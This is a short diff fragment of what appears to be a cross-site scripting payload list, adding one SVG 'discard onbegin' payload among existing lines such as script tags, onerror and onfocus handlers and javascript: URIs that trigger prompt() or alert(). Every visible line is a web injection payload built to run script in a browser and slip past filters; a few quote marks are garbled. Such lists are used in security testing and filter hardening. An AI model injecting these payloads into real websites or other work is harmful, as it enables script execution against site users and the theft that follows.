@@ -51,6 +51,7 @@ onmouseover=¡¯prompt(9)¡¯
 >"'><script>prompt(13)</script>
 <table background='javascript.:prompt(14)'></table>
 <object type=text/html data='javascript.:prompt(15);'></object>
+<svg><discard onbegin=[1].find(alert)>
 "+prompt(16)+"
 <body/onfocus=top.prompt(17)>
 <img/src=22 onerror=window.prompt(22)>
